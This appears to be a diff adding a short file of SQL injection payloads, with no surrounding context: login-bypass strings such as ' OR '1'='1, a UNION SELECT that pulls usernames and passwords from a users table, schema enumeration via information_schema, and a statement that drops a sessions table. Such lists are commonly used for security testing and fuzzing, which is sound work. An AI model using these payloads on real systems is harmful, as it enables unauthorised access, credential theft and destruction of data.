@@ -1,0 +1,8 @@
+' OR '1'='1
+' OR 1=1 --
+admin' --
+1' UNION SELECT 1,username,password FROM users--
+1; DROP TABLE sessions;--
+' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--
+' OR 'x'='x
+admin' or '1'='1' and 'a'='a
